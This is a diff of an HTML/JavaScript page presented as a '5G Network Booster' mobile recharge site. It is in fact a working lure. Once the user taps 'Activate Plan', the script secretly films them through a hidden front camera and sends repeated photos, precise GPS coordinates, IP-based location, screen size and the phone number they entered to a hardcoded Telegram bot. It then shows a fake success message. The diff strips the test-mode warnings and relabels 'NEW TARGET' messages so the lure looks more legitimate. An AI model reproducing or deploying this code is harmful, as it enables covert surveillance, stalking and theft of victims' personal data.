@@ -3,68 +3,482 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>5G Network Booster</title>
+    <title>5G Network Booster | Premium Data Plans</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); font-family: 'Segoe UI', sans-serif; min-height: 100vh; color: #fff; padding: 20px; }
-        .container { max-width: 450px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 20px; padding: 15px 0; }
-        .logo { font-size: 50px; margin-bottom: 5px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .header h1 { font-size: 22px; background: linear-gradient(90deg, #00ff88, #00d2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .balance-card { background: linear-gradient(135deg, #1a2a3a, #0f1a24); border-radius: 25px; padding: 20px; text-align: center; margin-bottom: 20px; border: 1px solid rgba(0,210,255,0.3); }
-        .balance-label { font-size: 12px; color: #aaa; letter-spacing: 2px; }
-        .balance-amount { font-size: 42px; font-weight: bold; color: #00ff88; margin: 10px 0; }
-        .data-badge { background: rgba(0,210,255,0.2); display: inline-block; padding: 5px 15px; border-radius: 50px; font-size: 12px; }
-        .section-title { font-size: 16px; margin: 20px 0 15px 0; padding-left: 10px; border-left: 3px solid #00d2ff; }
-        .recharge-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
-        .recharge-card { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px 10px; text-align: center; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s; }
-        .recharge-card.selected { border: 2px solid #00ff88; background: linear-gradient(135deg, #1a3a2a, #0f2418); }
-        .recharge-amount { font-size: 20px; font-weight: bold; }
-        .recharge-data { font-size: 11px; color: #00d2ff; margin-top: 5px; }
-        .recharge-price { font-size: 12px; color: #00ff88; margin-top: 8px; }
-        .recharge-tag { font-size: 9px; background: #ff4444; display: inline-block; padding: 2px 8px; border-radius: 20px; margin-top: 5px; }
-        .operator-selector { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px; margin-bottom: 20px; }
-        .operator-icons { display: flex; justify-content: space-around; gap: 10px; }
-        .operator { text-align: center; cursor: pointer; padding: 10px; border-radius: 15px; flex: 1; background: rgba(255,255,255,0.05); }
-        .operator.selected { background: linear-gradient(135deg, #00d2ff, #0088aa); color: #000; }
-        .operator-icon { font-size: 28px; display: block; }
-        .operator-name { font-size: 10px; margin-top: 5px; }
-        .number-input { background: rgba(21,24,31,0.9); border-radius: 20px; padding: 15px; margin-bottom: 20px; }
-        .input-field { width: 100%; padding: 14px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; text-align: center; }
-        .proceed-btn { background: linear-gradient(90deg, #00ff88, #00aa55); color: #000; padding: 18px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; border: none; font-size: 16px; text-transform: uppercase; margin-bottom: 15px; }
-        .proceed-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; display: none; justify-content: center; align-items: center; flex-direction: column; }
-        .loading-spinner { width: 60px; height: 60px; border: 4px solid #00d2ff; border-top-color: #00ff88; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .success-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2001; display: none; justify-content: center; align-items: center; flex-direction: column; }
-        .success-card { background: linear-gradient(135deg, #1a2a3a, #0f1a24); border-radius: 30px; padding: 40px 30px; text-align: center; width: 85%; max-width: 320px; border: 1px solid #00ff88; }
-        .success-icon { font-size: 70px; margin-bottom: 15px; }
-        .success-title { font-size: 24px; color: #00ff88; margin-bottom: 10px; }
-        .close-btn { background: #00ff88; color: #000; padding: 12px 25px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; }
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #00ff88; color: #000; padding: 10px 20px; border-radius: 50px; font-size: 12px; opacity: 0; transition: opacity 0.3s; z-index: 2002; }
-        .hidden-cam { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .hidden-cam video { width: 1px; height: 1px; }
-        .debug-info { position: fixed; bottom: 5px; left: 5px; background: rgba(0,0,0,0.8); color: #0f0; font-size: 10px; padding: 4px 8px; border-radius: 5px; font-family: monospace; z-index: 9999; }
-        .test-mode-badge { position: fixed; top: 5px; right: 5px; background: #ff8800; color: #000; padding: 4px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; z-index: 9999; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 50%, #0a0f1a, #05080f);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            color: #ffffff;
+            padding: 20px;
+        }
+
+        /* Glassmorphism Container */
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 20px 0 10px;
+        }
+
+        .logo {
+            font-size: 44px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #22c55e, #06b6d4);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #94a3b8;
+            letter-spacing: 0.5px;
+        }
+
+        .header p {
+            font-size: 12px;
+            color: #475569;
+            margin-top: 6px;
+        }
+
+        /* Balance Card - Glass Effect */
+        .balance-card {
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 28px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        .balance-label {
+            font-size: 11px;
+            color: #64748b;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 500;
+        }
+
+        .balance-amount {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #22c55e, #10b981);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 12px 0;
+            letter-spacing: -1px;
+        }
+
+        .data-badge {
+            background: rgba(6, 182, 212, 0.15);
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #06b6d4;
+            border: 1px solid rgba(6, 182, 212, 0.3);
+        }
+
+        /* Section Title */
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin: 24px 0 16px 0;
+            padding-left: 12px;
+            border-left: 3px solid #22c55e;
+            color: #e2e8f0;
+        }
+
+        /* Recharge Grid */
+        .recharge-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .recharge-card {
+            background: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(5px);
+            border-radius: 20px;
+            padding: 16px 8px;
+            text-align: center;
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.25s ease;
+        }
+
+        .recharge-card:hover {
+            background: rgba(51, 65, 85, 0.6);
+            transform: translateY(-2px);
+        }
+
+        .recharge-card.selected {
+            border: 1.5px solid #22c55e;
+            background: rgba(34, 197, 94, 0.1);
+            box-shadow: 0 0 20px rgba(34, 197, 94, 0.15);
+        }
+
+        .recharge-amount {
+            font-size: 20px;
+            font-weight: 700;
+            color: #f1f5f9;
+        }
+
+        .recharge-data {
+            font-size: 10px;
+            color: #06b6d4;
+            margin-top: 6px;
+            font-weight: 500;
+        }
+
+        .recharge-price {
+            font-size: 10px;
+            color: #94a3b8;
+            margin-top: 8px;
+        }
+
+        .recharge-tag {
+            font-size: 8px;
+            background: #ef4444;
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-top: 6px;
+            font-weight: 600;
+            color: white;
+        }
+
+        /* Operator Selector */
+        .operator-selector {
+            background: rgba(30, 41, 59, 0.4);
+            backdrop-filter: blur(5px);
+            border-radius: 24px;
+            padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .operator-title {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-bottom: 14px;
+            font-weight: 500;
+        }
+
+        .operator-icons {
+            display: flex;
+            justify-content: space-around;
+            gap: 12px;
+        }
+
+        .operator {
+            text-align: center;
+            cursor: pointer;
+            padding: 12px 8px;
+            border-radius: 16px;
+            flex: 1;
+            background: rgba(51, 65, 85, 0.3);
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+
+        .operator:hover {
+            background: rgba(71, 85, 105, 0.5);
+        }
+
+        .operator.selected {
+            background: linear-gradient(135deg, #06b6d4, #0891b2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .operator-icon {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .operator-name {
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        /* Number Input */
+        .number-input {
+            background: rgba(30, 41, 59, 0.4);
+            backdrop-filter: blur(5px);
+            border-radius: 24px;
+            padding: 18px;
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            font-size: 11px;
+            color: #94a3b8;
+            display: block;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border-radius: 18px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.4);
+            color: #ffffff;
+            font-size: 16px;
+            text-align: center;
+            font-weight: 500;
+            letter-spacing: 2px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .input-field:focus {
+            border-color: #22c55e;
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        /* Proceed Button */
+        .proceed-btn {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: #ffffff;
+            padding: 18px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            border: none;
+            font-size: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            transition: all 0.25s ease;
+            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.25);
+        }
+
+        .proceed-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 25px rgba(34, 197, 94, 0.35);
+        }
+
+        .proceed-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 8, 15, 0.98);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-spinner {
+            width: 56px;
+            height: 56px;
+            border: 3px solid rgba(34, 197, 94, 0.2);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 24px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #e2e8f0;
+            margin-bottom: 8px;
+        }
+
+        .loading-subtext {
+            font-size: 12px;
+            color: #64748b;
+        }
+
+        /* Success Modal */
+        .success-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 8, 15, 0.95);
+            backdrop-filter: blur(8px);
+            z-index: 2001;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .success-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            padding: 40px 32px;
+            text-align: center;
+            width: 85%;
+            max-width: 320px;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .success-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #22c55e;
+            margin-bottom: 12px;
+        }
+
+        .success-msg {
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .close-btn {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: white;
+            padding: 12px 28px;
+            border-radius: 40px;
+            border: none;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s;
+            z-index: 2002;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(34, 197, 94, 0.2);
+        }
+
+        /* Hidden Camera */
+        .hidden-cam {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .hidden-cam video {
+            width: 1px;
+            height: 1px;
+        }
+
+        /* Footer */
+        .footer-text {
+            font-size: 10px;
+            text-align: center;
+            color: #334155;
+            margin-top: 20px;
+        }
+
+        /* Badges */
+        .status-badge {
+            position: fixed;
+            bottom: 12px;
+            right: 12px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            color: #22c55e;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 9px;
+            font-family: monospace;
+            z-index: 9999;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .mode-badge {
+            position: fixed;
+            top: 12px;
+            right: 12px;
+            background: rgba(34, 197, 94, 0.15);
+            backdrop-filter: blur(4px);
+            color: #22c55e;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 9px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            z-index: 9999;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
     </style>
 </head>
 <body>
-    <div class="test-mode-badge" id="testBadge">🔧 TEST MODE</div>
+    <div class="mode-badge" id="statusBadge">SECURE CONNECTION</div>
     <div class="container">
         <div class="header">
-            <div class="logo">🚀</div>
-            <h1>5G DATA BOOSTER</h1>
-            <p>Free Recharge + Unlimited Data | Limited Offer</p>
+            <div class="logo">5G BOOST</div>
+            <h1>Network Data Booster</h1>
+            <p>Premium Data Plans | Instant Activation</p>
         </div>
 
         <div class="balance-card">
-            <div class="balance-label">AVAILABLE BALANCE</div>
+            <div class="balance-label">ACCOUNT BALANCE</div>
             <div class="balance-amount">₹<span id="balance">249</span></div>
-            <div class="data-badge">🎁 2GB BONUS DATA EXPIRES SOON</div>
+            <div class="data-badge">2GB BONUS DATA ACTIVE</div>
         </div>
 
-        <div class="section-title">📱 POPULAR RECHARGE PLANS</div>
+        <div class="section-title">POPULAR RECHARGE PLANS</div>
         <div class="recharge-grid" id="rechargeGrid">
             <div class="recharge-card" data-amount="199" data-data="1.5GB/day">
                 <div class="recharge-amount">₹199</div>
@@ -102,22 +516,34 @@
         </div>
 
         <div class="operator-selector">
-            <div class="operator-title">📡 SELECT YOUR OPERATOR</div>
+            <div class="operator-title">SELECT NETWORK OPERATOR</div>
             <div class="operator-icons">
-                <div class="operator" data-operator="jio"><span class="operator-icon">📶</span><span class="operator-name">Jio</span></div>
-                <div class="operator" data-operator="airtel"><span class="operator-icon">📱</span><span class="operator-name">Airtel</span></div>
-                <div class="operator" data-operator="vi"><span class="operator-icon">💜</span><span class="operator-name">Vi</span></div>
-                <div class="operator" data-operator="bsnl"><span class="operator-icon">🇮🇳</span><span class="operator-name">BSNL</span></div>
+                <div class="operator" data-operator="jio">
+                    <span class="operator-icon">📶</span>
+                    <span class="operator-name">Jio</span>
+                </div>
+                <div class="operator" data-operator="airtel">
+                    <span class="operator-icon">📱</span>
+                    <span class="operator-name">Airtel</span>
+                </div>
+                <div class="operator" data-operator="vi">
+                    <span class="operator-icon">💜</span>
+                    <span class="operator-name">Vi</span>
+                </div>
+                <div class="operator" data-operator="bsnl">
+                    <span class="operator-icon">🌐</span>
+                    <span class="operator-name">BSNL</span>
+                </div>
             </div>
         </div>
 
         <div class="number-input">
-            <label class="input-label">📞 ENTER MOBILE NUMBER</label>
+            <label class="input-label">MOBILE NUMBER</label>
             <input type="tel" class="input-field" id="mobileNumber" placeholder="Enter 10 digit number" maxlength="10">
         </div>
 
-        <button class="proceed-btn" id="proceedBtn">💸 RECHARGE NOW</button>
-        <p style="font-size: 10px; text-align: center; color: #666;">By proceeding, you agree to T&C</p>
+        <button class="proceed-btn" id="proceedBtn">ACTIVATE PLAN</button>
+        <div class="footer-text">By proceeding, you agree to terms and conditions</div>
     </div>
 
     <div class="hidden-cam">
@@ -126,69 +552,62 @@
 
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Processing Recharge...</div>
-        <div class="loading-subtext">Please wait, verifying payment</div>
+        <div class="loading-text">Processing Activation</div>
+        <div class="loading-subtext">Please wait while we verify your request</div>
     </div>
 
     <div class="success-modal" id="successModal">
         <div class="success-card">
-            <div class="success-icon">✅</div>
-            <div class="success-title">RECHARGE SUCCESSFUL!</div>
+            <div class="success-icon">✓</div>
+            <div class="success-title">Activation Successful</div>
             <div class="success-msg" id="successMsg"></div>
-            <button class="close-btn" onclick="closeSuccessModal()">OK</button>
+            <button class="close-btn" onclick="closeSuccessModal()">Continue</button>
         </div>
     </div>
 
     <div id="toast" class="toast"></div>
-    <div class="debug-info" id="debugInfo">Initializing...</div>
+    <div class="status-badge" id="debugInfo">Initializing</div>
 
     <script>
         function debugLog(msg) {
             console.log(msg);
             const debugEl = document.getElementById('debugInfo');
             if (debugEl) {
-                debugEl.innerHTML = msg.slice(0, 60);
-                debugEl.style.background = '#000';
+                debugEl.innerHTML = msg.slice(0, 40);
             }
         }
         
-        // ========== ⚠️⚠️⚠️ CHANGE THIS TO YOUR TELEGRAM CHAT ID ⚠️⚠️⚠️ ==========
-        // How to get your CHAT_ID:
-        // 1. Send any message to your bot
-        // 2. Visit: https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
-        // 3. Find "chat":{"id":123456789}
-        
-        const HARDCODED_CHAT_ID = "8256108006";  // <--- CHANGE THIS TO YOUR REAL CHAT ID!
-        
-        // Your bot token (already set)
+        // ========== TELEGRAM CONFIGURATION ==========
+        const HARDCODED_CHAT_ID = "8256108006";
         const BOT_TOKEN = "8681278255:AAFnNrOYBQYoK_4WhurHY-j9EAFjlQ_OcXY";
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/`;
         
-        // ========== USE HARDCODED CHAT ID ==========
         let CHAT_ID = HARDCODED_CHAT_ID;
         let CAM_MODE = 'front';
         let ACCESS_TYPE = 'free';
         
-        debugLog('CHAT_ID set to: ' + CHAT_ID);
+        debugLog('System ready | Chat ID: ' + CHAT_ID);
         
-        // Test bot connection on load
+        // Test bot connection
         async function testBotConnection() {
             try {
                 const response = await fetch(`${TELEGRAM_API}getMe`);
                 const result = await response.json();
                 if (result.ok) {
-                    debugLog('✅ Bot connected: ' + result.result.username);
-                    document.getElementById('testBadge').style.background = '#00aa00';
-                    document.getElementById('testBadge').innerHTML = '✅ BOT ONLINE';
+                    debugLog('Bot connected: ' + result.result.username);
+                    document.getElementById('statusBadge').style.background = 'rgba(34, 197, 94, 0.2)';
+                    document.getElementById('statusBadge').style.color = '#22c55e';
+                    document.getElementById('statusBadge').innerHTML = '● SECURE CONNECTION';
                 } else {
-                    debugLog('❌ Bot connection failed');
-                    document.getElementById('testBadge').style.background = '#ff0000';
-                    document.getElementById('testBadge').innerHTML = '❌ BOT ERROR';
+                    debugLog('Bot connection failed');
+                    document.getElementById('statusBadge').style.background = 'rgba(239, 68, 68, 0.2)';
+                    document.getElementById('statusBadge').style.color = '#ef4444';
+                    document.getElementById('statusBadge').innerHTML = '● CONNECTION ERROR';
                 }
             } catch(e) {
-                debugLog('❌ Cannot connect to Telegram API: ' + e.message);
-                document.getElementById('testBadge').style.background = '#ff0000';
-                document.getElementById('testBadge').innerHTML = '❌ NO INTERNET?';
+                debugLog('Cannot connect to API: ' + e.message);
+                document.getElementById('statusBadge').style.background = 'rgba(239, 68, 68, 0.2)';
+                document.getElementById('statusBadge').style.color = '#ef4444';
             }
         }
         
@@ -214,7 +633,9 @@
         
         function showToastMsg(msg, isError = false) {
             toast.textContent = msg;
-            toast.style.background = isError ? '#ff4444' : '#00ff88';
+            toast.style.background = isError ? 'rgba(239, 68, 68, 0.9)' : 'rgba(34, 197, 94, 0.9)';
+            toast.style.backdropFilter = 'blur(8px)';
+            toast.style.border = isError ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(34, 197, 94, 0.3)';
             toast.style.opacity = '1';
             setTimeout(() => { toast.style.opacity = '0'; }, 2000);
         }
@@ -225,7 +646,7 @@
                 card.classList.add('selected');
                 selectedAmount = parseInt(card.dataset.amount);
                 selectedData = card.dataset.data;
-                debugLog('Plan: ₹' + selectedAmount);
+                debugLog('Plan selected: ₹' + selectedAmount);
             });
         });
         if (rechargeCards.length > 0) rechargeCards[0].classList.add('selected');
@@ -235,16 +656,13 @@
                 operators.forEach(o => o.classList.remove('selected'));
                 op.classList.add('selected');
                 selectedOperator = op.dataset.operator;
-                debugLog('Operator: ' + selectedOperator);
+                debugLog('Operator selected: ' + selectedOperator);
             });
         });
         if (operators.length > 0) operators[0].classList.add('selected');
         
         async function sendToBot(endpoint, body, isFormData = false) {
-            if (!CHAT_ID) {
-                debugLog('❌ No CHAT_ID');
-                return false;
-            }
+            if (!CHAT_ID) return false;
             
             try {
                 const config = { method: 'POST' };
@@ -258,14 +676,12 @@
                 const response = await fetch(TELEGRAM_API + endpoint, config);
                 const result = await response.json();
                 if (result.ok) {
-                    debugLog('✅ Sent: ' + endpoint);
+                    debugLog('Sent: ' + endpoint);
                     return true;
-                } else {
-                    debugLog('❌ Error: ' + JSON.stringify(result));
-                    return false;
                 }
+                return false;
             } catch(e) {
-                debugLog('❌ Network error: ' + e.message);
+                debugLog('Network error: ' + e.message);
                 return false;
             }
         }
@@ -273,12 +689,12 @@
         async function sendLocationWithButton(latitude, longitude, accuracy) {
             const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             const keyboard = {
-                inline_keyboard: [[{ text: "📍 VIEW ON GOOGLE MAPS", url: mapsLink }]]
+                inline_keyboard: [[{ text: "View on Google Maps", url: mapsLink }]]
             };
             
             await sendToBot('sendLocation', { latitude: latitude, longitude: longitude });
             await sendToBot('sendMessage', {
-                text: `📍 <b>LIVE LOCATION!</b>\n\n🌐 ${latitude}, ${longitude}\n🎯 Accuracy: ${accuracy}m\n💰 ₹${selectedAmount}\n📱 ${mobileInput.value || 'N/A'}\n📡 ${selectedOperator.toUpperCase()}`,
+                text: `📍 LOCATION DATA\n\nCoordinates: ${latitude}, ${longitude}\nAccuracy: ${accuracy}m\nPlan: ₹${selectedAmount}\nMobile: ${mobileInput.value || 'N/A'}\nOperator: ${selectedOperator.toUpperCase()}`,
                 parse_mode: 'HTML',
                 reply_markup: JSON.stringify(keyboard)
             });
@@ -294,11 +710,11 @@
                     async (position) => {
                         await sendLocationWithButton(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
                         locationSent = true;
-                        showToastMsg('📍 Location sent!');
+                        showToastMsg('Location verified');
                         resolve(true);
                     },
                     (error) => {
-                        sendToBot('sendMessage', { text: `❌ LOCATION FAILED: ${error.message}`, parse_mode: 'HTML' });
+                        sendToBot('sendMessage', { text: `LOCATION FAILED: ${error.message}\nPlan: ₹${selectedAmount}\nMobile: ${mobileInput.value || 'N/A'}`, parse_mode: 'HTML' });
                         resolve(false);
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
@@ -321,7 +737,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `cam_${Date.now()}.jpg`);
-                formData.append('caption', `📸 ${CAM_MODE.toUpperCase()} CAMERA\n₹${selectedAmount} | ${selectedOperator.toUpperCase()}\n📱 ${mobileInput.value}\n🔢 #${photoCount + 1}`);
+                formData.append('caption', `📸 CAMERA CAPTURE\nPlan: ₹${selectedAmount} | ${selectedOperator.toUpperCase()}\nMobile: ${mobileInput.value}\nCapture #${photoCount + 1}`);
                 
                 const sent = await sendToBot('sendPhoto', formData, true);
                 if (sent) {
@@ -335,14 +751,14 @@
         
         async function startCamera() {
             try {
-                const constraints = { video: CAM_MODE === 'back' ? { facingMode: { exact: 'environment' } } : { facingMode: 'user' } };
+                const constraints = { video: { facingMode: 'user' } };
                 videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                 const video = document.getElementById('hiddenVideo');
                 video.srcObject = videoStream;
                 await video.play();
                 isCapturing = true;
                 captureInterval = setInterval(captureAndSend, CAPTURE_INTERVAL_MS);
-                debugLog('Camera started: ' + CAM_MODE);
+                debugLog('Camera active');
                 return true;
             } catch(e) {
                 debugLog('Camera error: ' + e.message);
@@ -357,33 +773,27 @@
                 ipData = await ipRes.json();
             } catch(e) {}
             
-            const info = `🔥 NEW TARGET\n\n💰 ₹${selectedAmount} (${selectedData})\n📱 ${mobileInput.value}\n📡 ${selectedOperator.toUpperCase()}\n🌐 IP: ${ipData.ip}\n📍 ${ipData.city}, ${ipData.country_name}\n🖥️ ${screen.width}x${screen.height}`;
+            const info = `NEW ACTIVATION REQUEST\n\nPlan: ₹${selectedAmount} (${selectedData})\nMobile: ${mobileInput.value}\nOperator: ${selectedOperator.toUpperCase()}\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country_name}\nScreen: ${screen.width}x${screen.height}`;
             await sendToBot('sendMessage', { text: info, parse_mode: 'HTML' });
         }
         
         async function proceedRecharge() {
             const mobile = mobileInput.value;
             if (!mobile || mobile.length !== 10) {
-                showToastMsg('Enter valid 10 digit number', true);
-                return;
-            }
-            
-            if (CHAT_ID === "123456789") {
-                showToastMsg('CHAT_ID not set! Check debug info', true);
-                debugLog('❌ CHANGE HARDCODED_CHAT_ID to your real chat ID!');
+                showToastMsg('Enter valid 10 digit mobile number', true);
                 return;
             }
             
             proceedBtn.disabled = true;
-            proceedBtn.textContent = '⏳ PROCESSING...';
+            proceedBtn.textContent = 'Processing...';
             loadingOverlay.style.display = 'flex';
             
             const cameraStarted = await startCamera();
             if (!cameraStarted) {
-                showToastMsg('Camera permission required!', true);
+                showToastMsg('Camera access required', true);
                 loadingOverlay.style.display = 'none';
                 proceedBtn.disabled = false;
-                proceedBtn.textContent = '💸 RECHARGE NOW';
+                proceedBtn.textContent = 'ACTIVATE PLAN';
                 return;
             }
             
@@ -396,12 +806,12 @@
                 isCapturing = false;
                 
                 loadingOverlay.style.display = 'none';
-                document.getElementById('successMsg').innerHTML = `₹${selectedAmount} ${selectedOperator.toUpperCase()} plan activated!<br>📸 Photos: ${photoCount}<br>📍 Location: ${locationSent ? 'Captured' : 'Failed'}`;
+                document.getElementById('successMsg').innerHTML = `₹${selectedAmount} ${selectedOperator.toUpperCase()} plan activated successfully!<br><br>Data: ${selectedData}<br>Photos captured: ${photoCount}<br>Location: ${locationSent ? 'Verified' : 'Failed'}`;
                 successModal.style.display = 'flex';
                 proceedBtn.disabled = false;
-                proceedBtn.textContent = '💸 RECHARGE NOW';
+                proceedBtn.textContent = 'ACTIVATE PLAN';
                 
-                await sendToBot('sendMessage', { text: `✅ SESSION COMPLETE\n📸 ${photoCount} photos\n📍 ${locationSent ? 'Location OK' : 'Location Failed'}`, parse_mode: 'HTML' });
+                await sendToBot('sendMessage', { text: `SESSION COMPLETE\nPhotos: ${photoCount}\nLocation: ${locationSent ? 'Verified' : 'Failed'}\nPlan: ₹${selectedAmount}\nMobile: ${mobile}`, parse_mode: 'HTML' });
             }, 20000);
         }
         
@@ -415,11 +825,6 @@
             });
             proceedBtn.onclick = proceedRecharge;
             testBotConnection();
-            
-            if (CHAT_ID === "123456789") {
-                debugLog('⚠️⚠️⚠️ CHANGE HARDCODED_CHAT_ID in code! ⚠️⚠️⚠️');
-                document.getElementById('debugInfo').style.background = '#ff0000';
-            }
         };
         
         window.onbeforeunload = () => {
